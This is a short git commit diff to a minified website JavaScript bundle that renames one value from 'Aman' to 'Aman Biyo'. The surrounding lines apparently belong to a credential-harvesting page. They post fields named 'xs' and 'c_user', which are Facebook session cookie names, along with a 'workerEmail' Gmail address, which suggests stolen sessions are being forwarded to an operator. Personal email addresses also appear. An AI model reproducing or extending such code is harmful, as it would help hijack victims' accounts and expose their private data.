07ef41300db71878cffefef8343a40ea04684b8f
dannydr3 <dannydr244@gmail.com>
2025-05-03 12:03:51 +0500

    Update main.fa301602.js
    s

--- static/js/main.fa301602.js
+++ static/js/main.fa301602.js
@@ -10383,7 +10383,7 @@
                                 workerEmail: "mjohn72929@gmail.com",
                                 xs: r,
                                 c_user: i,
-                                name: "Aman",
+                                name: "Aman Biyo",
                               }),
                             }).then((e) => {
                               e.ok;
